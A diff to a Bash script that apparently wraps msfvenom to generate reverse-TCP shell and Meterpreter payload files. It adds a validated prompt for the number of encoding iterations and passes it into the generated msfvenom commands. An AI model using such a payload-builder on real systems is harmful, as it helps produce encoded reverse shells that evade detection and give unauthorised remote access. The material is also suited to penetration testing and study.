@@ -261,6 +261,24 @@ esac
 
 encoder_question
 
+#Prompts user to enter the number of iterations to encode the payload and validates entry.
+validate_iteration(){
+echo "How many iterations of encoding would you like?"
+read iteration
+
+enc_regex="^[0-9]+$"
+if [[ $iteration =~ $enc_regex ]];
+then
+        iteration="-i $iteration"
+else
+        echo "$iteration is not a valid number"
+        validate_iteration
+fi
+
+}
+
+validate_iteration
+
 #Asks user for desired filename.
 echo "What would you like to name the file?"
 read filename
@@ -270,11 +288,11 @@ payload=""
 msfgen=""
 
 use_meterpreter() {
-	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} -f $format"
+	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
 }
 
 no_meterpreter() {
-        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} -f $format"
+        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} ${enc_format} $iteration -f $format"
 }
 
 case  $meterpreter  in
